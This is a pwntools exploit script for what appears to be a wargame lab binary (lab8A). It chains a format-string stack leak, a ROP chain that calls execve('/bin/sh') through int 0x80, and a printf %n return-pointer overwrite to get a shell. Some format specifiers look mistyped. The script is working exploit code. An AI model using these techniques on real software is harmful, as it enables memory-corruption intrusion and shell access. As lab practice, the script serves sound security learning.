from pwn import * 

p = process("/levels/lab08/lab8A") 

''' 
The first three functions are for the normal way through the program
'''
# Takes care of the first section 
def first_step(): 
    p.sendline('A') 

def second_section():
    payload = "" 
    payload += "A" * 16 
    payload += p32(0xdeadbeef) 
    p.sendline(payload) 

def pass_program():
    first_step() 
    second_section() 
    p.interactive() 
'''
Everything below this is exploit code
'''

# Using the printf(value), leak memory from the stack to be used later
def leak_memory():
    # I like to use the .... so that when I use the recvuntil, it is the next n characters for the leak. 
    p.sendline('....%x') 
    p.recvuntil('....')
    output = int(p.recvuntil('\n'),16)
    return output

# Write a value to a spefific location, using printf
def write_printf(location, value, offset, format_starting_point):
    
    payload = p32(location) + p32(location + 1) + p32(location + 2) + p32(location + 3) + "DDDD" + "%256x%2$n" +"%260x%3$hhn" + "%237x%4$hnn" + "%258x%5$hnn"
    # This filler is added to make the payload consistent... 
    # I do not know why this is needd. But, LiveOverflow mentioned it once and I have done this ever since!
    payload += "1" * (512 - len(payload)) 
    p.sendline(payload) 

def rop_gadget(leak):
    chain = "A" * 0x24 # First set of junk 

    #pop ecx gadget
    chain += p32(0x080e71c5) 
    chain += "\x00\x00\x00\x00" # Move in the null byte
    
    # pop edx gadget
    chain += p32(0x0806f22a) 
    chain += "\x00\x00\x00\x00"
    
    '''Eax with 0xb
    This is a complicated gadget... 
    So, the pop eax gadget that I wanted to use originally would not allow the character 0xb in 0x080bc506. 
    This gadget (where eax happens to be 0x0 already :)) increments eax by 1. This is done 11 times until the eax is at 0xb or 11. 
    '''
    chain += (p32(0x0805d233) + "DDDD") * 11
   
    # Pop ebx gadget
    chain += p32(0x080481c9)
    chain += p32(leak - 0x17c) # Relative pointer to the /bin/sh added to the stack later
    
    # Gadget to make the syscall with int 0x80 to pop shell :) 
    chain += p32(0x08048ef6)

    # /bin/sh that is referenced in ebx gadget
    chain += "/bin/sh\x00"
    p.sendline(chain) 


'''
Full exploit cahin
'''
pause() 

# Leaks a stack value
leak = leak_memory() 
print "Memory leak...", hex(leak) 

# Adds the rop gadget to the stack 
rop_gadget(leak) 

# Uses the printf vuln to write to a ret pointer to go into a gadget
# The location references to the second recursive calls ret pointer
write_printf(leak - 0x220, 1, 0x10, 2) 
# Rets
p.sendline("F") 

# Shell :) 
p.interactive() 


